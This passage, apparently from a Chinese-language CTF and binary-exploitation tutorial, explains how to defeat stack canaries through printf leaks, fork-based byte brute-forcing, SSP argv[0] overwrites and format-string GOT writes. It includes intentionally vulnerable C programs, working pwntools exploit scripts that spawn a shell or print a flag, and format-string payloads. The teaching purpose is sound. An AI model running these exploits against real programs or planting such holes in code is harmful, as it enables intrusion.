title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下，编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello Hacker!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -no-pie test.c -o test3</span></span><br></pre></td></tr></table></figure><p>这题只需要利用print函数的信息泄露获取到canary值的地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_shell_func_addr = elf.sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]get shell func addr: &quot;</span> + <span class="built_in">hex</span>(get_shell_func_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="comment">#利用两次for循环来获取canary_value的值</span></span><br><span class="line"><span class="comment">#第一次利用溢出获取返回的值，由于canary的保护我们不会覆盖到ebp，程序可以进行运行</span></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span>*<span class="number">100</span>).encode()</span><br><span class="line">io.sendline(payload1)<span class="comment">#必须使用带&#x27;\n&#x27;的值进行poc结尾，也就是模拟回车键</span></span><br><span class="line"><span class="comment">#输出带有payload1和canary混合的值，用recvuntil来接收处理</span></span><br><span class="line">recvuntil_value=io.recvuntil(payload1)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">b&quot;[*]recvuntil value: &quot;</span> + recvuntil_value)</span><br><span class="line">canary_value = u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span><span class="comment">#0xa是\n的十六进制值，ASCII表对应</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]canary value: &quot;</span> + <span class="built_in">hex</span>(canary_value))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]canary value add 0xa: &quot;</span> + <span class="built_in">hex</span>(canary_value+<span class="number">0xa</span>))</span><br><span class="line">payload2 = (<span class="string">&quot;A&quot;</span>*<span class="number">100</span>).encode()+p32(canary_value)+(<span class="string">&quot;A&quot;</span>*<span class="number">12</span>).encode()+p32(get_shell_func_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="爆破Canary值"><a href="#爆破Canary值" class="headerlink" title="爆破Canary值"></a>爆破Canary值</h3><p>每次进程重启后的canary不同，且同一个进程中的每个线程的canary也不同。但是如果程序通过fork函数开启子进程交互的话，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的。我们可以利用这样的特点，逐个字节将canary爆破出来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">fun();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">wait(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -m32 -no-pie test.c -o test4</span></span><br><span class="line"><span class="comment">//echo &quot;hello wrod by ascotbe&quot; &gt; flag</span></span><br></pre></td></tr></table></figure><p>可以看到源码里面溢出点是100个字符，并且运行程序如果一直按回车会启动N个进程</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/31.png" alt="image-20210401114355036"></p><p>因为canary的 最后的一个字节总是<strong>0x00</strong>（为了截断数据，小端排序），所以只需要爆破剩下的三个字节就可以了，每次尝试一个字节，如果程序顺利执行得到结果<code>welcome\n</code>，否则程序崩溃，通过穷举就能爆破处正确的canary值。64位的话爆破7位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test4&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_flag_func_addr = elf.sym[<span class="string">&#x27;getflag&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">test=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        io.send((<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>).encode()+ canary + <span class="built_in">bytes</span>([i]))<span class="comment">#int转换成bytes用这个方法，可以直接转换为16进制的</span></span><br><span class="line">        a = io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;recv&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">bytes</span>([i])</span><br><span class="line">            print(<span class="string">b&quot;[*] Blasting out byte :&quot;</span>+canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">print(<span class="string">b&quot;[*] canary is :&quot;</span>+canary)</span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>).encode() + canary+ (<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>).encode() + p32(get_flag_func_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">flag = io.recv()</span><br><span class="line">io.close()</span><br><span class="line">log.success(<span class="string">&quot;flag is:&quot;</span> + flag.decode())</span><br></pre></td></tr></table></figure><p><del>弱类型语言类型转换真的有点恶心</del></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/32.png" alt="image-20210401173411704"></p><h3 id="SSP（Stack-Smashing-Protector-）"><a href="#SSP（Stack-Smashing-Protector-）" class="headerlink" title="SSP（Stack Smashing Protector ）"></a>SSP（Stack Smashing Protector ）</h3><p>利用原理是Canary值被修改然后函数不能正常执行，会<code>call __stack_chk_fail</code>打印**argv[0]**这个指针指向的字符串，默认是程序的名字。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们把它覆盖为flag的地址时，它就会把flag给打印出来，注意不要用原来flag的地址覆盖，因为原来存储flag的地址会被overwrite，但是由于ELF的映射方式，此flag会被映射两次，另一个地方的flag的内容不会变，原因是<code>__stack_chk_fail</code>会调用<strong>libc_message</strong></p><p><a href="https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229">题目地址</a>    <a href="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/smashes">备用地址</a></p><p>我们使用IDA查看一下代码，可以发现溢出点在下面这段代码中的<code>_IO_getc</code>函数中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  byte_600D20[v0++] = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双击<code>byte_600D20</code>可以看到这样的画面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600D20 ; char byte_600D20[]</span><br><span class="line">.data:0000000000600D20 byte_600D20     db 50h                  ; DATA XREF: sub_4007E0+6E↑w</span><br><span class="line">.data:0000000000600D21 aCtfHereSTheFla db &#39;CTF&#123;Here&#39;,27h,&#39;s the flag on server&#125;&#39;,0</span><br><span class="line">.data:0000000000600D21 _data           ends</span><br></pre></td></tr></table></figure><p>由此可知，服务器端中的 flag 应该也在这个位置上。接下来我们需要下个断点来进入main函数，但是由于程序经过了strip处理，没有debug信息，所以我们需要下断点到<code>__libc_start_main</code>函数才能看到，可以看到RDI的值才是main函数的真正入口</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/33.png" alt="image-20210402134315830"></p><p><strong>0x7fffffffe269</strong>指向程序名，其自然就是argv[0]，所以我们修改的内容就是这个地址。<br>同时<strong>0x7fffffffded8</strong>处保留着该地址，所以我们真正需要的地址是<strong>0x7fffffffded8</strong></p><p>接着我们需要找到栈顶到这个argv[0]的偏移，从而方便我们计算出需要填充的字符个数</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/34.png" alt="image-20210403203337757"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/35.png" alt="image-20210406215300344"></p><p>从图中我们可以知道，我们只需要把断点下到<code>_IO_gets</code>这个函数之前就能获取到argv[0]的偏移，接着可以看到</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/36.png" alt="image-20210406215520252"></p><p>地址是<strong>0x40080E</strong>，我们只需要在这个位置下个断点，看RSP的值即可</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/37.png" alt="image-20210406220110587"></p><p>所以偏移值为<strong>0x7fffffffded8 - 0x7fffffffdcc0 = 0x218</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find CTF</span><br><span class="line">Searching for &#x27;CTF&#x27; in: None ranges</span><br><span class="line">Found <span class="number">2</span> results, display max <span class="number">2</span> items:</span><br><span class="line">smashes : <span class="number">0x400d21</span> (<span class="string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)</span><br><span class="line">smashes : <span class="number">0x600d21</span> (<span class="string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>接着找到flag的值，但是看上文中有两个值，我们直接是用<strong>0x400d21</strong>这个值</p><div class="note default modern"><p>据网上的WP说法，ELF的重映射，当可执行文件足够小的时候，他的不同区段可能会被多次映射，留个坑后面填</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_main_func_addr = <span class="number">0x7fffffffded8</span></span><br><span class="line">get_io_gets_func_addr = <span class="number">0x7fffffffdcc0</span></span><br><span class="line">flag_addr = <span class="number">0x400d21</span></span><br><span class="line">offset=get_main_func_addr - get_io_gets_func_addr</span><br><span class="line">print(<span class="string">&quot;[*] offset is :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(offset)))</span><br><span class="line">payload = (<span class="string">&quot;A&quot;</span> * offset).encode() + p64(flag_addr)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello!\nWhat&#x27;s your name?&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>可以看到最终我们输出了flag的值</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/38.png" alt="image-20210406222753429"></p><h3 id="劫持stack-chk-fail函数"><a href="#劫持stack-chk-fail函数" class="headerlink" title="劫持stack_chk_fail函数"></a>劫持stack_chk_fail函数</h3><p>从SSP中我们可以得知Canary失败的处理逻辑会进入到 __stack_chk_failed函数，__stack_chk_failed函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。</p><h4 id="漏洞存在点"><a href="#漏洞存在点" class="headerlink" title="漏洞存在点"></a>漏洞存在点</h4><p>格式化字符串是一种很常见的漏洞，其产生根源是printf函数设计的缺陷，printf函数它并不知道自己现在的参数个数有几个，但是它的内部却有个指针用来索检格式化字符串。对于遇到特定类型%，就去执行取相应参数的值，直到索检到格式化字符串结束。如果printf语句没有带格式化字符参数的话，那么就一定存在格式化字符串漏洞。</p><h4 id="格式化字符"><a href="#格式化字符" class="headerlink" title="格式化字符"></a>格式化字符</h4><table><thead><tr><th align="left">格式字符</th><th align="center">意义</th></tr></thead><tbody><tr><td align="left">d</td><td align="center">以十进制形式输出带符号整数(正数不输出符号)</td></tr><tr><td align="left">o</td><td align="center">以八进制形式输出无符号整数(不输出前缀0)</td></tr><tr><td align="left">x</td><td align="center">以十六进制形式输出无符号整数(不输出前缀Ox)</td></tr><tr><td align="left">u</td><td align="center">以十进制形式输出无符号整数</td></tr><tr><td align="left">f</td><td align="center">以小数形式输出单、双精度实数</td></tr><tr><td align="left">e</td><td align="center">以指数形式输出单、双精度实数</td></tr><tr><td align="left">g</td><td align="center">以%f或%e中较短的输出宽度输出单、双精度实数</td></tr><tr><td align="left">c</td><td align="center">输出单个字符</td></tr><tr><td align="left">s</td><td align="center">输出字符串</td></tr><tr><td align="left">p</td><td align="center">输出指针地址，可以用来计算格式化字符的偏移</td></tr><tr><td align="left">n</td><td align="center">将%n之前已经打印的字符个数赋值给偏移处指针所指向的地址位置</td></tr></tbody></table><ul><li>%hhn 向某地址写入1字节</li><li>%hn 向某个地址写入2字节</li><li>%n 向某个地址写入4字节</li><li>%lln 向某地址写入8字节</li></ul><h4 id="漏洞的利用手段"><a href="#漏洞的利用手段" class="headerlink" title="漏洞的利用手段"></a>漏洞的利用手段</h4><ul><li><p>搞破坏，使程序崩溃。</p><p>因为%s对应的参数地址不合法的概率还是比较大的。所以直接输入无数个%s让其遇到不合法地址然后崩溃。</p></li><li><p>泄露内存</p><p>泄露栈内容：获取某个变量的值；获取某个变量对应地址的内存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32bit：   %n$x : 返回栈上第（n+1）个参数的值</span><br><span class="line">64bit：   %n$p 或者 %n$llx (64bit) ：返回栈上第（n-5）个参数的值</span><br></pre></td></tr></table></figure><p>泄露任意地址内存：利用got表得到libc函数地址，进而获取其他libc函数地址；盲目地dump整个程序，获取有用信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32bit：   %n$s：把栈上第n+1个参数的值作为地址，返回该地址内存的值</span><br><span class="line">64bit：   %n$s：把栈上第n-5个参数的值作为地址，返回该地址内存的值</span><br></pre></td></tr></table></figure></li><li><p>修改内存数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%***c%n$n：  把栈上第n+1个参数的值作为地址，将该地址的高32bit值改为 hex(***)</span><br><span class="line">%***c%n$hn： 把栈上第n+1个参数的值作为地址，将该地址的高16bit值改为 hex(***)</span><br><span class="line">%***c%n$hhn：把栈上第n+1个参数的值作为地址，将该地址的高8bit值改为 hex(***)</span><br><span class="line">[64bit下，（n+1）变为（n-5）即可 ]</span><br></pre></td></tr></table></figure></li></ul><h4 id="控制符-n-的利用"><a href="#控制符-n-的利用" class="headerlink" title="控制符 %n 的利用"></a>控制符 %n 的利用</h4><p>在格式化控制符中有一个 %n ，它用于把当前输出的所有数据的长度写回一个变量中去。</p><p>由于可能会造成溢出漏洞从而进程被恶意代码劫持，现如今该控制符貌似很早之前就被弃用了。<br>现在只有在 vc 6.0++ 和 linux 上还可以用。</p><p>举一个栗子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%n\n&quot;</span>,&amp;length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,length);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出：</span></span><br><span class="line"><span class="comment">//hello</span></span><br><span class="line"><span class="comment">//5</span></span><br></pre></td></tr></table></figure><p>该程序首先会输出 hello ，然后把字符串长度5存回 &amp;length变量里，第二次输出length变量的值即是5。</p><h5 id="任意地址写-32位"><a href="#任意地址写-32位" class="headerlink" title="任意地址写(32位)"></a>任意地址写(32位)</h5><p>32位的地址在前面，64位的地址在后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(system_addr)+ <span class="string">&#x27;%012c&#x27;</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>举个栗子方便理解</p><p>比如payload为 <code>\x8c\x97\x04\x08%2048c%5$n</code> ，那么我们就可以把<strong>0x0804978c</strong>地址里的内容修改为**0x804 **（2048+4字节）</p></li><li><p>再举个栗子</p><p>例如要把printf的地址 修改为 system地址。我们采取单字节的修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf_got=<span class="number">0x08049778</span>  </span><br><span class="line">system_plt=<span class="number">0x08048320</span></span><br><span class="line">payload=p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)+p32(printf_got+<span class="number">3</span>)</span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x20</span>-<span class="number">16</span>)+<span class="string">&quot;c%5$hhn&quot;</span>  </span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x83</span>-<span class="number">0x20</span>)+<span class="string">&quot;c%6$hhn&quot;</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x104</span>-<span class="number">0x83</span>)+<span class="string">&quot;c%7$hhn&quot;</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x08</span>-<span class="number">0x04</span>)+<span class="string">&quot;c%8$hhn&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h5 